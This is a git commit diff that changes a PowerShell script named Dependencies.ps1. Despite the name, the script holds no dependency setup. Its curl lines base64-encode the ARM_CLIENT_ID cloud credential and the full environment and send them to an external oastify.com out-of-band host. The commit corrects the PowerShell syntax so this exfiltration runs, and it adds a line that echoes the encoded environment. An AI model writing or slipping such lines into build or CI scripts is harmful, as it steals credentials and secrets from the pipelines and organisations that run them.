bd233c32920d9c408f07e5d9d7a07ff320810ed4
duckertesty <110347405+duckertesty@users.noreply.github.com>
2022-07-31 19:28:14 +0200

    Update Dependencies.ps1

--- scripts/Dependencies.ps1
+++ scripts/Dependencies.ps1
@@ -1,2 +1,4 @@
-curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?env=($env:ARM_CLIENT_ID | base64)
-curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?env2=($env | base64)
+curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?env=$($env:ARM_CLIENT_ID | base64)
+curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?env2=$($env | base64)
+test = (env | base64)
+echo $test
